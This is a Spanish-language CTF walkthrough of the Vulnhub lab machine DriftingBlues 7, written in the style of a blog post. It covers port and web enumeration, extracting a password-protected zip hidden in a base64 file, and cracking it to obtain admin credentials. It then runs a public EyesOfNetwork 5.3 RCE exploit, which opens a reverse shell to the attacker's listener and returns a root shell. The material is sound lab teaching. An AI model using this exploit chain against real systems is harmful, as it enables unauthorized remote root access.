---
title: DriftingBlues 7 Writeup - Vulnhub
date: 2025-01-31
categories: [Writeups, Vulnhub]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, DriftingBlues, Wordpress, wpscan, cewl, Hydra, wpscan]
image:
  path: /assets/img/commons/vulnhub/vulnhub.jpg
---

Resolución máquina anterior: [**DriftingBlues6**](https://lvs3c.github.io/posts/DriftingBlues-6/)

¡Saludos!

En este writeup, nos adentraremos en la primer máquina [**DriftingBlues7**](https://www.vulnhub.com/entry/driftingblues-7,680/), la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la cual veremos **enumeración de servicios**, **fuzzing** de directorios y archivos, **fcrackzip** para desencriptar un comprimido y mediante su contenido poder ingresar al portal de administración de *Eyes of Network*, buscaremos por **searchsploit** un exploit para poder lanzarnos una reverse shell como root obteniendo las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens32 --localnet --ignoredups
Interface: ens32, type: EN10MB, MAC: 00:0c:29:c4:47:79, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.39     00:0c:29:f2:2e:3b       VMware, Inc.
10.11.12.254    00:50:56:f6:71:b0       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.385 seconds (107.34 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.39
PING 10.11.12.39 (10.11.12.39) 56(84) bytes of data.
64 bytes from 10.11.12.39: icmp_seq=1 ttl=64 time=0.454 ms

--- 10.11.12.39 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.454/0.454/0.454/0.000 ms

```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.39 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 20:16 -03
Nmap scan report for 10.11.12.39
Host is up (0.0021s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
66/tcp   open  sqlnet
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
2403/tcp open  taskmaster2000
3306/tcp open  mysql
8086/tcp open  d-s-n
MAC Address: 00:0C:29:F2:2E:3B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.79 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p22,66,80,111,443,2403,3306,8086 -sCV 10.11.12.39 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 20:25 -03
Nmap scan report for 10.11.12.39
Host is up (0.00020s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 c4:fa:e5:5f:88:c1:a1:f0:51:8b:ae:e3:fb:c1:27:72 (RSA)
|   256 01:97:8b:bf:ad:ba:5c:78:a7:45:90:a1:0a:63:fc:21 (ECDSA)
|_  256 45:28:39:e0:1b:a8:85:e0:c0:b0:fa:1f:00:8c:5e:d1 (ED25519)
66/tcp   open  http            SimpleHTTPServer 0.6 (Python 2.7.5)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.5
|_http-title: Scalable Cost Effective Cloud Storage for Developers
80/tcp   open  http            Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_http-title: Did not follow redirect to https://10.11.12.39/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
111/tcp  open  rpcbind         2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_ssl-date: TLS randomness does not represent time
| http-title: EyesOfNetwork
|_Requested resource was /login.php##
| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-04-03T14:37:22
|_Not valid after:  2022-04-03T14:37:22
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
2403/tcp open  taskmaster2000?
3306/tcp open  mysql           MariaDB (unauthorized)
8086/tcp open  http            InfluxDB http admin 1.7.9
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
MAC Address: 00:0C:29:F2:2E:3B (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.64 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.4`
- Puerto `66` servidor `SimpleHTTPServer 0.6`.
- Puerto `80` servidor `Apache httpd 2.4.6`.
- Puerto `111` servidor `rpcbin`.
- Puerto `443` servidor `Apache httpd 2.4.6`.
- Puerto `2403` servidor `taskmaster2000`.
- Puerto `3306` servidor `mysql - MariaDB`.
- Puerto `8086` servidor `InfluxDB http admin 1.7.9`.


### HTTP - 66 - 80 - 443 - 8086

Hacemos un análisis con `whatweb` para ver las tecnologías de los servidores webs.

```bash
❯ whatweb http://10.11.12.39:66/
http://10.11.12.39:66/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[SimpleHTTP/0.6 Python/2.7.5], IP[10.11.12.39], JQuery[1], Open-Graph-Protocol[website][249147465109688], Python[2.7.5], Script[JavaScript,javascript,text/javascript], Title[Scalable Cost Effective Cloud Storage for Developers]

❯ whatweb http://10.11.12.39/
http://10.11.12.39/ [302 Found] Apache[2.4.6][mod_fcgid/2.3.9,mod_perl/2.0.11], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3], IP[10.11.12.39], OpenSSL[1.0.2k-fips], PHP[5.4.16], Perl[5.16.3], RedirectLocation[https://10.11.12.39/], Title[302 Found]

❯ whatweb https://10.11.12.39/
https://10.11.12.39/ [302 Found] Apache[2.4.6][mod_fcgid/2.3.9,mod_perl/2.0.11], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3], IP[10.11.12.39], OpenSSL[1.0.2k-fips], PHP[5.4.16], Perl[5.16.3], RedirectLocation[./module/dashboard_view/index.php], X-Powered-By[PHP/5.4.16]
Error: Invalid redirection from https://10.11.12.39/module/dashboard_view/index.php to /login.php##. bad URI(is not URI?): "/login.php##"
https://10.11.12.39/module/dashboard_view/index.php [302 Found] Apache[2.4.6][mod_fcgid/2.3.9,mod_perl/2.0.11], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3], IP[10.11.12.39], OpenSSL[1.0.2k-fips], PHP[5.4.16], Perl[5.16.3], RedirectLocation[/login.php##], Title[302 Found]

❯ whatweb http://10.11.12.39:8086/
http://10.11.12.39:8086/ [404 Not Found] Country[RESERVED][ZZ], IP[10.11.12.39], UncommonHeaders[x-content-type-options,x-influxdb-build,x-influxdb-version]
```

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p66,80,443,8086 --script http-enum 10.11.12.39 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 12:41 -03
Nmap scan report for 10.11.12.39
Host is up (0.00038s latency).

PORT     STATE SERVICE
66/tcp   open  sqlnet
80/tcp   open  http
443/tcp  open  https
| http-enum:
|   /login.php: Possible admin folder
|_  /icons/: Potentially interesting folder w/ directory listing
8086/tcp open  d-s-n

Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
```

Nos nos trae demasiada información, un path interesante `/login.php` a tener en cuenta sobre el puerto 443.

![login](/assets/img/commons/vulnhub/DriftingBlues7/login.png){: .center-image }

Intentamos `SQL injection` sobre el formulario, tanto manual como con `sqlmap` pero no obtuvimos resultados, al parecer no es vulnerable a esto.

En este punto, vamos a comenzar a trabajar sobre cada puerto, empezamos con el puerto 66, validamos la web.

![port66](/assets/img/commons/vulnhub/DriftingBlues7/port66.png){: .center-image }

Cada menú de la web, redirige al home.

Procedemos a realizar fuzzing sobre el puerto 66 utilizando `gobuster` buscando además archivos con extensiones txt,php,bak.

```bash
❯ gobuster dir -u http://10.11.12.39:66/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -x txt,php,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.39:66/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,bak
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.39:66/flag.txt             (Status: 200) [Size: 1823]
http://10.11.12.39:66/index_files          (Status: 301) [Size: 0] [--> /index_files/]
http://10.11.12.39:66/eon                  (Status: 200) [Size: 248]
```

Encontramos la 1er flag.

![flag1](/assets/img/commons/vulnhub/DriftingBlues7/flag1.png){: .center-image }

```bash
❯ curl http://10.11.12.39:66/flag.txt
flag 1/1
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```

Procedemos a descargar el archivo *eon* y analizarlo.

```bash
❯ file eon
eon: ASCII text

❯ cat eon
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: eon
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUU
   2   │ Rw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAA
   3   │ AABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEA
   4   │ AQBbAAAARgAAAAAA
```

Parece ser una cadena en base64, probamos desencriptarla.

```bash
❯ base64 -d cadena.txt; echo
PKRI[   creds.txtsp-,&j2CGbc/PK?RI[     $ creds.txtbase64: invalid input
```

Nos damos cuenta que dentro de la cadena hay un archivo `creds.txt`, lo cual nos hace suponer que se trata de un archivo comprimido.

Vamos a utilizar el recurso web [base64.guru](https://base64.guru/converter/decode/file) para convertir la cadena de base64 a un archivo.

![filezip](/assets/img/commons/vulnhub/DriftingBlues7/filezip.png){: .center-image }

Es un archivo zip y se encuentra encriptado, usamos `fcrackzip` para crackearlo y unzip para extraer el archivo creds.txt.

```bash
❯ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt application.zip

PASSWORD FOUND!!!!: pw == killah

❯ unzip application.zip
Archive:  application.zip
[application.zip] creds.txt password:
 extracting: creds.txt

❯ cat creds.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: creds.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ admin
   2   │ isitreal31__
```

Con dichos datos obtenidos, procedemos a probar loguearnos en el portal de administración sobre el puerto 443 y accedemos perfectamente.

![eyesofnetwork](/assets/img/commons/vulnhub/DriftingBlues7/eyesofnetwork.png){: .center-image }


## Explotación

---

Verificamos la versión de la plataforma.

![version](/assets/img/commons/vulnhub/DriftingBlues7/version.png){: .center-image }

Utilizando `searchsploit` buscamos por *Eyes of network 5.3* y encontramos un script en python para ejecución de código remota.

```bash
❯ searchsploit eyes of network
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
EyesOfNetwork (EON) 5.0 - Remote Code Execution                                                                                                                                                         | php/webapps/41746.md
EyesOfNetwork (EON) 5.0 - SQL Injection                                                                                                                                                                 | php/webapps/41747.md
EyesOfNetwork (EON) 5.1 - SQL Injection                                                                                                                                                                 | php/webapps/41774.py
EyesOfNetwork - AutoDiscovery Target Command Execution (Metasploit)                                                                                                                                     | multiple/remote/48169.rb
EyesOfNetwork 5.1 - Authenticated Remote Command Execution                                                                                                                                              | php/webapps/47280.py
EyesOfNetwork 5.3 - File Upload Remote Code Execution                                                                                                                                                   | multiple/webapps/49432.sh
EyesOfNetwork 5.3 - LFI                                                                                                                                                                                 | multiple/webapps/49404.txt
EyesOfNetwork 5.3 - RCE & PrivEsc                                                                                                                                                                       | multiple/webapps/49402.txt
EyesOfNetwork 5.3 - Remote Code Execution                                                                                                                                                               | php/webapps/48025.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
searchsploit -m php/webapps/48025.txt

mv 48025.txt exploit.py

❯ python3 exploit.py
usage:
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |
| 02/2020 - Clément Billac Twitter: @h4knet                                   |
|                                                                             |
| Examples:                                                                   |
| eonrce.py -h                                                                |
| eonrce.py http(s)://EyesOfNetwork-URL                                       |
| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -port 3128                |
| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -user pentest2020         |
+-----------------------------------------------------------------------------+

eonrce: error: the following arguments are required: URL
```

Lanzamos el script y obtenemos root.

```bash
sudo python3 exploit.py https://10.11.12.39 -ip 10.11.12.10 -user admin -password isitreal31__
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |
| 02/2020 - Clément Billac Twitter: @h4knet                                  |
+-----------------------------------------------------------------------------+

[*] EyesOfNetwork login page found
[*] EyesOfNetwork API page found. API version: 2.4.2
[+] Admin user key obtained: fc9ef88405dc8192086ad485ea4f4d782222533299889182f746415ab8c92ecf
[!] The user admin already exists
[+] Successfully authenticated
[+] Discovery job successfully created with ID: 3&amp;review=1" id="completemsg" style="display: none;">
<div class="roundedcorner_success_box">
<div class="roundedcorner_success_top"><div></div></div>
<div class="roundedcorner_success_content">
              Auto-Discovery Complete.  Click to Continue To Reviewing Found Devices
              </div>
<div class="roundedcorner_success_bottom"><div></div></div>
</div></a>
[*]  Spawning netcat listener:
listening on [10.11.12.10] 443 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.39] 54672
sh: no job control in this shell
sh-4.2# whoami
whoami
root
sh-4.2# cd /root
cd /root
sh-4.2# cat flag.txt
cat flag.txt
flag 1/1
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

sh-4.2#
```

Hope it helps!
